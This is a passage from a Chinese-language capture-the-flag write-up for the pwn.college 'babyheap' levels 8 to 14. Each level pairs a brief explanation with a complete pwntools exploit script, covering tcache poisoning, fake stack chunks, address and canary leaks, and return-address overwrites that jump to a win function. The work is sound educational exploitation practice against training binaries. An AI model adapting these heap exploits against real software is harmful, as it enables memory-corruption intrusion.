class="hljs-string">b&quot;Index: &quot;</span>,<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">18</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>,<span class="hljs-string">b&quot;send_flag&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;Secret: &quot;</span>,<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">16</span>)<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h4 id="level8-1"><a href="#level8-1" class="headerlink" title="level8.1"></a>level8.1</h4><p>exp一致，改改address就行。</p>
+<h4 id="level9-0"><a href="#level9-0" class="headerlink" title="level9.0"></a>level9.0</h4><p>这一题不让我们把secret地址malloc出来，也就不能scanf往里写了。但是其实之前我们发现每次malloc会把key清0，之前尝试leak的时候就出现这个问题，所以才有思路scanf往里直接写。那么我们直接malloc两次就行了。第一次在secret地址，第二次在secret - 8的地址，这样就能把secret清空了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = process(<span class="hljs-string">&quot;/challenge/babyheap_level9.0&quot;</span>)<br><span class="hljs-comment"># 清空secret+8 ~ secret+15 </span><br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 0 100&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 1 100&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;free 0&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;free 1&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>,<span class="hljs-string">b&quot;scanf 1&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;Index: &quot;</span>,p64(<span class="hljs-number">0x426553</span>))<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 1 100&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 0 100&quot;</span>)<br><span class="hljs-comment"># 清空secret ~ secret+7</span><br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 0 100&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 1 100&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;free 0&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;free 1&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>,<span class="hljs-string">b&quot;scanf 1&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;Index: &quot;</span>,p64(<span class="hljs-number">0x42654b</span>))<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 1 100&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 0 100&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>,<span class="hljs-string">b&quot;send_flag&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;Secret: &quot;</span>,<span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">16</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h4 id="level9-1"><a href="#level9-1" class="headerlink" title="level9.1"></a>level9.1</h4><p>exp一致，改改地址就行。</p>
+<h4 id="level10-0"><a href="#level10-0" class="headerlink" title="level10.0"></a>level10.0</h4><p>它有两个leak，一个是main的入口地址，一个是我们malloc时保存堆地址的指针数组地址。</p>
+<p>根据ida可以通过指针数组地址算出rbp的地址，相对应的也就控制了返回地址。那么我们通过malloc存储main返回地址的栈地址，然后将写入win函数的地址。最后再quit即可。win函数的入口地址可以通过main函数的地址算出来。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = process(<span class="hljs-string">&quot;/challenge/babyheap_level10.0&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;[LEAK] The local stack address of your allocations is at: &quot;</span>)<br>alloc_stack = p.recv(<span class="hljs-number">14</span>)<br>alloc_stack = <span class="hljs-built_in">int</span>(alloc_stack, <span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;[LEAK] The address of main is at: &quot;</span>)<br>main_addr = p.recv(<span class="hljs-number">14</span>)<br>main_addr = <span class="hljs-built_in">int</span>(main_addr, <span class="hljs-number">16</span>)<br>ret_addr = alloc_stack + <span class="hljs-number">0x118</span><br>win_addr = main_addr - <span class="hljs-number">0x1afd</span> + <span class="hljs-number">0x1a00</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(main_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(ret_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(win_addr))<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 0 100&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 1 100&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/quit): &quot;</span>, <span class="hljs-string">b&quot;free 0&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/quit): &quot;</span>, <span class="hljs-string">b&quot;free 1&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/quit): &quot;</span>, <span class="hljs-string">b&quot;scanf 1&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;Index: &quot;</span>, p64(ret_addr))<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 1 100&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 0 100&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/quit): &quot;</span>, <span class="hljs-string">b&quot;scanf 0&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;Index: &quot;</span>, p64(win_addr))<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/quit): &quot;</span>, <span class="hljs-string">b&quot;quit&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h4 id="level10-1"><a href="#level10-1" class="headerlink" title="level10.1"></a>level10.1</h4><p>有些奇怪的IO问题，跑exp偶尔会出错。我写的exp确实挺烂的，啊哈哈。</p>
+<h4 id="level11-0"><a href="#level11-0" class="headerlink" title="level11.0"></a>level11.0</h4><p>这题会有fork然后执行echo。然后菜单多了个echo的选项，看一下这个echo函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title function_">echo</span><span class="hljs-params">(__int64 a1, __int64 a2)</span><br>&#123;<br>  <span class="hljs-type">char</span> **argv; <span class="hljs-comment">// [rsp+18h] [rbp-18h]</span><br>  _WORD v4[<span class="hljs-number">7</span>]; <span class="hljs-comment">// [rsp+22h] [rbp-Eh] BYREF</span><br><br>  *(_QWORD *)&amp;v4[<span class="hljs-number">3</span>] = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  <span class="hljs-built_in">strcpy</span>((<span class="hljs-type">char</span> *)v4, <span class="hljs-string">&quot;Data:&quot;</span>);<br>  argv = (<span class="hljs-type">char</span> **)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20u</span>LL);<br>  *argv = <span class="hljs-string">&quot;/bin/echo&quot;</span>;<br>  argv[<span class="hljs-number">1</span>] = (<span class="hljs-type">char</span> *)v4;<br>  argv[<span class="hljs-number">2</span>] = (<span class="hljs-type">char</span> *)(a1 + a2);<br>  argv[<span class="hljs-number">3</span>] = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">if</span> ( !fork() )<br>  &#123;<br>    execve(*argv, argv, <span class="hljs-number">0LL</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  wait(<span class="hljs-number">0LL</span>);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28u</span>) ^ *(_QWORD *)&amp;v4[<span class="hljs-number">3</span>];<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>调试一下不难发现<code>/bin/echo</code>这个字符串在<code>base_adr + 0x33f8</code>处。那么可以通过<code>echo 0 0</code>拿到<code>base_adr + 0x33f8</code>从而算出<code>base_addr</code></p>
+<p>同理，根据<code>rbp</code>所存的为上一个函数的栈地址，也就是main函数的栈帧rbp。那么通过<code>echo 0 8</code>拿到<code>v4</code>的地址，那么对应的也就拿到了</p>
+<p><code>echo</code>函数的<code>rbp</code>栈地址。最后根据<code>echo</code>函数的栈的地址，能够根据偏移算出<code>main</code>函数的<code>rbp</code>地址，相应的也就拿到了<code>main_ret</code>地址。最后的exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = process(<span class="hljs-string">&quot;/challenge/babyheap_level11.1&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 0 32&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/quit): &quot;</span>, <span class="hljs-string">b&quot;free 0&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/quit): &quot;</span>, <span class="hljs-string">b&quot;echo 0 0&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Data: &quot;</span>)<br>base_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>)) - <span class="hljs-number">0x2110</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;base_addr:&quot;</span>, <span class="hljs-built_in">hex</span>(base_addr))<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/quit): &quot;</span>, <span class="hljs-string">b&quot;echo 0 8&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Data: &quot;</span>)<br>main_ret_adr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>)) + <span class="hljs-number">0xe</span> + <span class="hljs-number">0x160</span> + <span class="hljs-number">0x8</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;main_ret_adr:&quot;</span>, <span class="hljs-built_in">hex</span>(main_ret_adr))<br>win_addr = base_addr + <span class="hljs-number">0x1500</span><br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 0 100&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 1 100&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/quit): &quot;</span>, <span class="hljs-string">b&quot;free 0&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/quit): &quot;</span>, <span class="hljs-string">b&quot;free 1&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/quit): &quot;</span>, <span class="hljs-string">b&quot;scanf 1&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;Index: &quot;</span>, p64(main_ret_adr))<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 1 100&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 0 100&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/quit): &quot;</span>, <span class="hljs-string">b&quot;scanf 0&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;Index: &quot;</span>, p64(win_addr))<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/quit): &quot;</span>, <span class="hljs-string">b&quot;quit&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="level11-1"><a href="#level11-1" class="headerlink" title="level11.1"></a>level11.1</h4><p>改改偏移。</p>
+<h4 id="level12-0"><a href="#level12-0" class="headerlink" title="level12.0"></a>level12.0</h4><p>通过<code>stack_scanf</code>能够在栈上创建一个<code>fake chunk</code>，这使得我们能够free。但是需要谨记free时在<code>bin</code>中，<code>chunk_size</code>字段的最低位要为1。exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = process(<span class="hljs-string">&quot;/challenge/babyheap_level12.1&quot;</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/stack_malloc_win/quit): &quot;</span>, <span class="hljs-string">b&quot;stack_scanf&quot;</span>)<br>pause()<br>p.sendline(<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">48</span> + p64(<span class="hljs-number">0x00</span>) + p64(<span class="hljs-number">0x41</span>) + p64(<span class="hljs-number">0x00</span>) + p64(<span class="hljs-number">0x00</span>))<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/stack_malloc_win/quit): &quot;</span>, <span class="hljs-string">b&quot;stack_free&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/stack_malloc_win/quit): &quot;</span>, <span class="hljs-string">b&quot;stack_malloc_win&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h4 id="level12-1"><a href="#level12-1" class="headerlink" title="level12.1"></a>level12.1</h4><p>同理，只需要构造一个<code>fake chunk</code>，构造<code>fake chunk</code>其实只需要覆盖<code>size</code>字段。</p>
+<h4 id="level13-0"><a href="#level13-0" class="headerlink" title="level13.0"></a>level13.0</h4><p>这题有点炸裂，我看ida反编译出来的<code>scanf</code>操作只能限制输入<code>127</code>个字节。结果实际上是和<code>chunk size</code>一致的，也就是说你的<code>chunk size</code>越大那么你的<code>scanf</code>就越大。<del>这是一个傻子在疯狂算偏移之后，发现无法覆盖secret然后绞尽脑汁发现没有办法后试了一下后醒悟的</del></p>
+<p>那么这exp简直不要太好写，直接覆盖掉<code>secret</code>就好了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = process(<span class="hljs-string">&quot;/challenge/babyheap_level13.0&quot;</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;stack_scanf&quot;</span>)<br>pause()<br>p.sendline(<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">48</span>+ p64(<span class="hljs-number">0x101</span>) + p64(<span class="hljs-number">0x101</span>))<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;stack_free&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 0 248&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;scanf 0&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;Index: &quot;</span>, <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">256</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;send_flag&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;Secret: &quot;</span>, <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">16</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;quit&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h4 id="level13-1"><a href="#level13-1" class="headerlink" title="level13.1"></a>level13.1</h4><p>同上，改两个<code>chunk_size</code>即可。</p>
+<h4 id="level14-0"><a href="#level14-0" class="headerlink" title="level14.0"></a>level14.0</h4><p><code>echo</code>又回归了<code>Function (malloc/free/echo/scanf/stack_free/stack_scanf/quit)</code></p>
+<p>它依然会malloc<code>0x20</code>个字节，这题就需要泄露栈地址和基地址，然后计算出<code>main_ret_addr</code>和<code>win_addr</code></p>
+<blockquote>
+<p>之前一直没说，chunk的size字段和实际申请的size的关系：</p>
+<p><code>malloc(24)</code>时，那么实际会分配32字节的数据，<code>24</code>字节的用户数据，<code>8</code>字节的头部。而<code>size</code>字段为：<code>0x21</code>，因为三个标志位分别为:<code>P=1</code>,<code>M=0</code>,<code>N=0</code>，最低位为P因此为<code>0x21</code></p>
+</blockquote>
+<p>思路就是首先通过<code>echo</code>拿到<code>/bin/sh</code>的地址，然后减去其偏移则得到程序基址。那么就得到了<code>win</code>函数的入口地址。</p>
+<p>随后，通过<code>stack_scanf</code>和<code>stack_free</code>创建一个<code>fake chunk</code>，然后通过<code>malloc</code>这个chunk从而拿到栈上的地址，再通过<code>echo</code>将<code>canary</code>泄露出来。最后再通过<code>scanf</code>模拟栈溢出，然后覆盖返回地址为<code>win_addr</code>就行了。</p>
+<p>当然，这里有两个问题：</p>
+<ul>
+<li><code>canary</code>有可能某个字节随机为制表符<code>0x09</code>和<code>0x0a</code>等，这种情况下使用<code>scanf(&quot;%s&quot;,v14)</code>时就会出现截断，导致后面的数据不会被接收，从而出错。</li>
+<li>同理，这里的<code>win_addr</code>也有可能会出现这个问题。</li>
+</ul>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p = process(<span class="hljs-string">&quot;/challenge/babyheap_level14.1&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/stack_free/stack_scanf/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;malloc 0 32&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/stack_free/stack_scanf/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;free 0&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/stack_free/stack_scanf/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;echo 0 0&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Data: &quot;</span>)<br>base_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>)) - <span class="hljs-number">0x2110</span><br>win_addr = base_addr + <span class="hljs-number">0x141d</span><br><br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/stack_free/stack_scanf/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;stack_scanf&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">48</span>+ p64(<span class="hljs-number">0x00</span>) + p64(<span class="hljs-number">0x21</span>))<br><br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/stack_free/stack_scanf/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;stack_free&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/stack_free/stack_scanf/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;malloc 0 24&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/stack_free/stack_scanf/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;echo 0 73&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Data: &quot;</span>)<br>canary = p.recv(<span class="hljs-number">7</span>)<br><br>canary = p8(<span class="hljs-number">0x0</span>) + canary<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;canary:&quot;</span>, <span class="hljs-built_in">hex</span>(u64(canary)))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;base_addr:&quot;</span>, <span class="hljs-built_in">hex</span>(base_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;win_addr:&quot;</span>, <span class="hljs-built_in">hex</span>(win_addr))<br><br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/stack_free/stack_scanf/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;stack_scanf&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">48</span>+ p64(<span class="hljs-number">0x00</span>) + p64(<span class="hljs-number">0x31</span>))<br><br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/stack_free/stack_scanf/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;stack_free&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/stack_free/stack_scanf/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;malloc 0 40&quot;</span>)<br><br><span class="hljs-comment"># pause()</span><br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/stack_free/stack_scanf/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;scanf&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;0&quot;</span>)<br>pause()<br>p.sendline(<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x48</span> + canary + p64(<span class="hljs-number">0xdeadbeef</span>) + p64(win_addr))<br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/stack_free/stack_scanf/quit): &quot;</span>)<br>p.sendline(<span 